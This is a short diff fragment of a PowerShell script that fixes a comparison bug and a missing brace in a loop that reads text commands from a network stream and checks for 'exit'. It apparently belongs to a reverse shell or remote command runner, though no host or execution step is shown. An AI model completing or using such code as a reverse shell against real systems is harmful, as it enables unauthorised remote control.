@@ -10,8 +10,9 @@ do
 	$read = $null;
 	$res = ""
 	while($stream.DataAvailable -or $read -eq $null) {
-		$read = $stream.Read($buffer, 0, 1024)
-		if ($read=0){exit}
+		$read = $stream.Read($buffer, 0, 1024);
+        if ($read -eq 0){exit}
+	}
 	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
 	if(!$out.equals("exit")){
 		$args = "";
